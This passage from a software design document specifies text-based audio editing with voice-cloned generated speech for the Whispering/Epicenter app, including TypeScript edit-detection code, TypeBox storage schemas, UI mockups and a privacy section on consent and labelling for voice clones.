				currentTime += estimatedLength;
			}
		}
		// ... other types
	}

	return items;
}

function estimateDuration(text: string): number {
	// Rough estimate: ~0.3 seconds per word, ~0.1 per syllable
	const words = text.split(/\s+/).length;
	return words * 0.35;
}
```

### Text Edit Detection

```typescript
type EditDetectionResult =
	| { type: 'deletion'; indices: number[] }
	| { type: 'modification'; items: ModifiedItem[] }
	| { type: 'insertion'; text: string; position: number }
	| { type: 'structural' };

interface ModifiedItem {
	uuid: string;
	originalText: string;
	newText: string;
	needsGeneration: boolean;
}

function detectEdits(
	before: DocumentItem[],
	after: DocumentItem[],
	editRange: { start: number; end: number },
): EditDetectionResult {
	// Compare documents to determine what changed

	// Case 1: Pure deletion (no new text)
	if (isOnlyDeletion(before, after)) {
		return { type: 'deletion', indices: getDeletedIndices(before, after) };
	}

	// Case 2: Text modification (word changed)
	const modified = findModifiedText(before, after);
	if (modified.length > 0) {
		return {
			type: 'modification',
			items: modified.map((m) => ({
				uuid: m.uuid,
				originalText: m.before,
				newText: m.after,
				needsGeneration: true,
			})),
		};
	}

	// Case 3: New text inserted
	const inserted = findInsertedText(before, after);
	if (inserted) {
		return {
			type: 'insertion',
			text: inserted.text,
			position: inserted.position,
		};
	}

	return { type: 'structural' };
}

// When user types new text, convert to generated_text items
function insertGeneratedText(
	document: EditableDocument,
	text: string,
	position: number,
	speaker: string,
): EditableDocument {
	const words = text.split(/\s+/).filter((w) => w.length > 0);
	const voiceId = document.speakers?.[speaker]?.voiceCloneId;

	const newItems: GeneratedTextItem[] = words.map((word) => ({
		type: 'generated_text',
		uuid: nanoid(),
		text: word,
		voice: voiceId || 'default',
		status: 'pending',
	}));

	return {
		...document,
		content: [
			...document.content.slice(0, position),
			...newItems,
			...document.content.slice(position),
		],
	};
}
```

### UI Considerations

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    EDITOR UI WITH GENERATED TEXT                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  Transcript Display:                                                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚ Hello my name is Claude and I love âš¡[Svelte]                    â”‚    â”‚
â”‚  â”‚                                     â””â”€â”€â”€â”¬â”€â”€â”€â”˜                    â”‚    â”‚
â”‚  â”‚                            Generated text indicator              â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                          â”‚
â”‚  Status Indicators:                                                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  Original text      â”‚  Normal styling                           â”‚    â”‚
â”‚  â”‚  âš¡ Pending          â”‚  Dashed border, yellow background         â”‚    â”‚
â”‚  â”‚  â³ Generating       â”‚  Spinner, progress bar                    â”‚    â”‚
â”‚  â”‚  âœ“ Generated        â”‚  Solid border, light blue background      â”‚    â”‚
â”‚  â”‚  âœ— Failed           â”‚  Red border, "Retry" button               â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                          â”‚
â”‚  Context Menu (on generated text):                                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                             â”‚
â”‚  â”‚ â–¶ Preview              â”‚                                             â”‚
â”‚  â”‚ â†» Regenerate           â”‚                                             â”‚
â”‚  â”‚ ğŸ­ Change Style...     â”‚ â†’ Neutral, Excited, Sad, Whisper            â”‚
â”‚  â”‚ ğŸ—‘ Delete               â”‚                                             â”‚
â”‚  â”‚ â†© Revert to Original   â”‚ (if was a modification)                     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                             â”‚
â”‚                                                                          â”‚
â”‚  Voice Clone Panel:                                                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  Speaker: Alice                                                  â”‚    â”‚
â”‚  â”‚  Voice Clone: âœ“ Created (ElevenLabs)                            â”‚    â”‚
â”‚  â”‚  Sample Duration: 45 seconds                                     â”‚    â”‚
â”‚  â”‚  [Test Voice] [Re-clone] [Delete Clone]                         â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Privacy & Security Considerations

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    PRIVACY & SECURITY                                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  VOICE DATA IS HIGHLY SENSITIVE                                         â”‚
â”‚                                                                          â”‚
â”‚  Risks:                                                                  â”‚
â”‚  â€¢ Voice clones enable impersonation and fraud                          â”‚
â”‚  â€¢ Audio samples sent to third-party APIs                               â”‚
â”‚  â€¢ Generated audio could be misused (deepfakes)                         â”‚
â”‚  â€¢ Voice biometrics are personally identifiable                         â”‚
â”‚                                                                          â”‚
â”‚  Mitigations:                                                            â”‚
â”‚                                                                          â”‚
â”‚  1. EXPLICIT CONSENT                                                     â”‚
â”‚     â€¢ Prominent warning before first voice clone                        â”‚
â”‚     â€¢ "I understand this creates an AI clone of my voice"               â”‚
â”‚     â€¢ Consent stored in document metadata                               â”‚
â”‚                                                                          â”‚
â”‚  2. LOCAL-FIRST OPTION                                                   â”‚
â”‚     â€¢ Coqui XTTS plugin for fully offline voice cloning                 â”‚
â”‚     â€¢ No data leaves device                                             â”‚
â”‚     â€¢ Recommended for sensitive content                                 â”‚
â”‚                                                                          â”‚
â”‚  3. CLEAR LABELING                                                       â”‚
â”‚     â€¢ Generated audio visually distinguished in UI                      â”‚
â”‚     â€¢ Export option to embed "AI-generated" metadata                    â”‚
â”‚     â€¢ Optional audio watermarking                                       â”‚
â”‚                                                                          â”‚
â”‚  4. CAPABILITY RESTRICTIONS                                              â”‚
â”‚     â€¢ "voice:clone" is explicit plugin capability                       â”‚
â”‚     â€¢ User approves which plugins can clone voices                      â”‚
â”‚     â€¢ Audit log of voice clone operations                               â”‚
â”‚                                                                          â”‚
â”‚  5. PROVIDER SELECTION                                                   â”‚
â”‚     â€¢ Settings to choose TTS provider                                   â”‚
â”‚     â€¢ "None" option disables voice synthesis entirely                   â”‚
â”‚     â€¢ Per-project provider override                                     â”‚
â”‚                                                                          â”‚
â”‚  Plugin Capabilities:                                                    â”‚
â”‚  {                                                                       â”‚
â”‚    "voice:synthesize": true,  // Generate speech from text              â”‚
â”‚    "voice:clone": true        // Create voice clones (sensitive!)       â”‚
â”‚  }                                                                       â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Document Metadata for Voice Clones

```typescript
interface EditableDocument {
	content: DocumentItem[];
	sources: Record<string, Source>;
	metadata: {
		displaySpeakerNames: boolean;
		displayVideo: boolean;
	};

	// Voice clone data
	speakers?: Record<string, SpeakerData>;
}

interface SpeakerData {
	name: string;
	language?: string;

	// Voice cloning
	voiceCloneId?: string; // Provider's voice ID
	voiceCloneProvider?: string; // Which TTS provider
	voiceCloneCreatedAt?: number; // Timestamp
	voiceCloneConsent?: {
		givenAt: number;
		givenBy: string; // User identifier
	};

	// Sample tracking
	sampleSegments?: Array<{
		sourceId: string;
		start: number;
		end: number;
	}>;
}
```

### Implementation Phases

| Phase | Scope                                 | Dependencies          |
| ----- | ------------------------------------- | --------------------- |
| **1** | Text-based editing (Section 16)       | Word-level timestamps |
| **2** | Voice Synth Actor + plugin interface  | Phase 1               |
| **3** | Stock voice TTS (OpenAI, Piper)       | Phase 2               |
| **4** | Voice cloning (ElevenLabs plugin)     | Phase 3               |
| **5** | Local voice cloning (Coqui XTTS)      | Phase 4               |
| **6** | Advanced features (styles, streaming) | Phase 5               |

---

## Epicenter Vault Integration

### Overview

This section analyzes how text-based media editing integrates with the Epicenter Vault architecture, specifically the new YJS-backed workspace system in `feat/epicenter-app` branch.

### Current Vault Architecture (main branch)

The current Whispering vault uses markdown files with YAML frontmatter:

```
recordings/
â”œâ”€â”€ {id}.md          â† Metadata (YAML) + transcribed text (body)
â””â”€â”€ {id}.webm        â† Audio file (separate)
```

**Recording structure:**

```markdown
---
id: abc123
title: Meeting Notes
subtitle: Quick note
timestamp: 2025-10-28T10:30:00Z
createdAt: 2025-10-28T10:30:00Z
updatedAt: 2025-10-28T10:35:00Z
transcriptionStatus: DONE
---

Hello my name is Claude and I love coding.
```

**Limitations for text-based editing:**

- `transcribedText` is plain string (no word-level data)
- No segment/timestamp information stored
- YAML frontmatter would become unwieldy with thousands of word segments
- No built-in collaboration support

### New Vault Architecture (feat/epicenter-app)

The `feat/epicenter-app` branch introduces a YJS-backed workspace system with typed fields:

```typescript
// Field types available
id(); // Primary key
text(); // String
select(); // Enum
boolean(); // Boolean
integer(); // Number (int)
real(); // Number (float)
date(); // DateTime
tags(); // String array
richtext(); // Collaborative rich text (separate Y.Doc)
json(); // Arbitrary JSON with TypeBox schema  â† KEY ENABLER!
```

**The `json` field type is the key enabler for text-based editing** - it can store arbitrary structured data with full type safety via TypeBox schemas.

### Current Whispering Template

```typescript
// apps/epicenter/src/lib/templates/whispering.ts (feat/epicenter-app)
export const WHISPERING_TEMPLATE = {
	id: 'epicenter.whispering',
	name: 'Whispering',
	tables: {
		recordings: table({
			name: 'Recordings',
			icon: 'ğŸ™ï¸',
			description: 'Voice recordings and transcriptions',
			fields: {
				id: id(),
				title: text({ name: 'Title' }),
				subtitle: text({ name: 'Subtitle' }),
				timestamp: text({ name: 'Timestamp' }),
				createdAt: text({ name: 'Created At' }),
				updatedAt: text({ name: 'Updated At' }),
				transcribedText: text({ name: 'Transcribed Text' }), // Still plain text!
				transcriptionStatus: select({
					name: 'Status',
					options: ['UNPROCESSED', 'TRANSCRIBING', 'DONE', 'FAILED'],
				}),
			},
		}),
	},
	kv: {},
} as const;
```

**Gap:** No `segments` field for word-level data yet.

### Enhanced Template for Text-Based Editing

```typescript
import { Type } from 'typebox';
import { id, text, select, boolean, json, table } from '@epicenter/hq';

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TYPEBOX SCHEMAS FOR DOCUMENT ITEMS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const ParagraphStartSchema = Type.Object({
	type: Type.Literal('paragraph_start'),
	uuid: Type.String(),
	speaker: Type.String(),
	language: Type.Union([Type.String(), Type.Null()]),
});

const ParagraphEndSchema = Type.Object({
	type: Type.Literal('paragraph_end'),
	uuid: Type.String(),
});

const TextItemSchema = Type.Object({
	type: Type.Literal('text'),
	uuid: Type.String(),
	source: Type.String(), // Recording ID (references audio file)
	sourceStart: Type.Number(), // Start time in source (seconds)
	length: Type.Number(), // Duration (seconds)
	text: Type.String(), // Transcribed word
	conf: Type.Number(), // Confidence (0-1)
});

const NonTextItemSchema = Type.Object({
	type: Type.Literal('non_text'),
	uuid: Type.String(),
	source: Type.String(),
	sourceStart: Type.Number(),
	length: Type.Number(),
});

const ArtificialSilenceSchema = Type.Object({
	type: Type.Literal('artificial_silence'),
	uuid: Type.String(),
	length: Type.Number(),
});

const GeneratedTextSchema = Type.Object({
	type: Type.Literal('generated_text'),
	uuid: Type.String(),
	text: Type.String(),
	voice: Type.String(),
	style: Type.Optional(Type.String()),
	generatedSource: Type.Optional(Type.String()),
	length: Type.Optional(Type.Number()),
	status: Type.Union([
		Type.Literal('pending'),
		Type.Literal('generating'),
		Type.Literal('generated'),
		Type.Literal('failed'),
	]),
});

const DocumentItemSchema = Type.Union([
	ParagraphStartSchema,
	ParagraphEndSchema,
	TextItemSchema,
	NonTextItemSchema,
	ArtificialSilenceSchema,
	GeneratedTextSchema,
]);

const SpeakerDataSchema = Type.Object({
	name: Type.String(),
	language: Type.Optional(Type.String()),
	voiceCloneId: Type.Optional(Type.String()),
	voiceCloneProvider: Type.Optional(Type.String()),
	voiceCloneCreatedAt: Type.Optional(Type.Number()),
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ENHANCED WHISPERING TEMPLATE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

export const WHISPERING_TEMPLATE = {
	id: 'epicenter.whispering',
	name: 'Whispering',
	tables: {
		recordings: table({
			name: 'Recordings',
			icon: 'ğŸ™ï¸',
			description: 'Voice recordings and transcriptions',
			fields: {
				id: id(),
				title: text({ name: 'Title' }),
				subtitle: text({ name: 'Subtitle' }),
				timestamp: text({ name: 'Timestamp' }),
				createdAt: text({ name: 'Created At' }),
				updatedAt: text({ name: 'Updated At' }),

				// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
				// LEGACY: Plain text (backwards compat, search, copy)
				// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
				transcribedText: text({ name: 'Transcribed Text' }),
				transcriptionStatus: select({
					name: 'Status',
					options: ['UNPROCESSED', 'TRANSCRIBING', 'DONE', 'FAILED'],
				}),

				// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
				// NEW: Word-level segments for text-based editing
				// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
				segments: json({
					name: 'Segments',
					description: 'Word-level transcript with source references',
					schema: Type.Array(DocumentItemSchema),
					nullable: true, // null = legacy recording without segments
				}),

				// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
				// NEW: Speaker data for voice synthesis
				// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
				speakers: json({
					name: 'Speakers',
					description: 'Speaker metadata and voice clone references',
					schema: Type.Record(Type.String(), SpeakerDataSchema),
					nullable: true,
				}),

				// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
				// NEW: Project mode flag
				// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
				isProject: boolean({
					name: 'Is Project',
					description: 'True if recording has been opened for editing',
					default: false,
				}),
			},
		}),
	},
	kv: {},
} as const;
```

### Storage Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ENHANCED STORAGE ARCHITECTURE                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  {appDataDir}/                                                          â”‚
â”‚  â””â”€â”€ workspaces/                                                        â”‚
â”‚      â””â”€â”€ {workspace-guid}/                                              â”‚
â”‚          â”‚                                                              â”‚
â”‚          â”‚   # YJS Documents (structured data)                          â”‚
â”‚          â”œâ”€â”€ definition.json      # Workspace schema                    â”‚
â”‚          â”œâ”€â”€ head.yjs             # Current epoch                       â”‚
â”‚          â””â”€â”€ 0.yjs                # Workspace data (recordings table)   â”‚
â”‚                                                                          â”‚
â”‚  {appDataDir}/                                                          â”‚
â”‚  â””â”€â”€ recordings/                  # Audio files (binary, separate)      â”‚
â”‚      â”œâ”€â”€ {id}.webm                # Original recording audio            â”‚
â”‚      â”œâ”€â”€ {id}.webm                # Another recording                   â”‚
â”‚      â””â”€â”€ {id}.generated/          # AI-generated audio clips            â”‚
â”‚          â”œâ”€â”€ gen_abc123.webm                                            â”‚
â”‚          â””â”€â”€ gen_def456.webm                                            â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Key design decisions:**

1. **Structured data in YJS** - Recording metadata + segments stored in YJS workspace
2. **Audio files separate** - Binary audio remains in file system (not in YJS)
3. **Generated audio in subdirectory** - AI-generated clips stored per-recording
4. **Source references** - Segments point to recording IDs (audio file lookup)

### Data Flow

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    RECORDING â†’ PROJECT DATA FLOW                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  1. INITIAL RECORDING                                                   â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚
â”‚     â”‚ Recording {                                   â”‚                    â”‚
â”‚     â”‚   id: 'abc123',                              â”‚                    â”‚
â”‚     â”‚   title: 'Meeting Notes',                    â”‚                    â”‚
â”‚     â”‚   transcriptionStatus: 'DONE',               â”‚                    â”‚
â”‚     â”‚   transcribedText: 'Hello my name is...',   â”‚                    â”‚
â”‚     â”‚   segments: null,        â† No word data yet  â”‚                    â”‚
â”‚     â”‚   isProject: false,                          â”‚                    â”‚
â”‚     â”‚ }                                            â”‚                    â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚
â”‚                          â”‚                                               â”‚
â”‚                          â”‚ User clicks "Edit as Project"                 â”‚
â”‚                          â–¼                                               â”‚
â”‚  2. RE-TRANSCRIBE WITH TIMESTAMPS                                       â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚
â”‚     â”‚ Transcription service returns:               â”‚                    â”‚
â”‚     â”‚ {                                            â”‚                    â”‚
â”‚     â”‚   text: 'Hello my name is Claude',           â”‚                    â”‚
â”‚     â”‚   segments: [                                â”‚                    â”‚
â”‚     â”‚     { word: 'Hello', start: 0.0, end: 0.3 }, â”‚                    â”‚
â”‚     â”‚     { word: 'my', start: 0.3, end: 0.5 },    â”‚                    â”‚
â”‚     â”‚     ...                                      â”‚                    â”‚
â”‚     â”‚   ]                                          â”‚                    â”‚
â”‚     â”‚ }                                            â”‚                    â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚
â”‚                          â”‚                                               â”‚
â”‚                          â”‚ Convert to document items                     â”‚
â”‚                          â–¼                                               â”‚
â”‚  3. EDITABLE PROJECT                                                    â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚
â”‚     â”‚ Recording {                                   â”‚                    â”‚
â”‚     â”‚   id: 'abc123',                              â”‚                    â”‚
â”‚     â”‚   title: 'Meeting Notes',                    â”‚                    â”‚
â”‚     â”‚   transcriptionStatus: 'DONE',               â”‚                    â”‚
â”‚     â”‚   transcribedText: 'Hello my name is...',   â”‚                    â”‚
â”‚     â”‚   segments: [              â† Word-level data â”‚                    â”‚
â”‚     â”‚     { type: 'paragraph_start', speaker: 'User', ... },           â”‚
â”‚     â”‚     { type: 'text', text: 'Hello', source: 'abc123',             â”‚
â”‚     â”‚       sourceStart: 0.0, length: 0.3, ... },                      â”‚
â”‚     â”‚     { type: 'text', text: 'my', source: 'abc123',                â”‚
â”‚     â”‚       sourceStart: 0.3, length: 0.2, ... },                      â”‚
â”‚     â”‚     ...                                      â”‚                    â”‚
â”‚     â”‚   ],                                         â”‚                    â”‚
â”‚     â”‚   isProject: true,        â† Now a project    â”‚                    â”‚
â”‚     â”‚ }                                            â”‚                    â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚
â”‚                                                                          â”‚
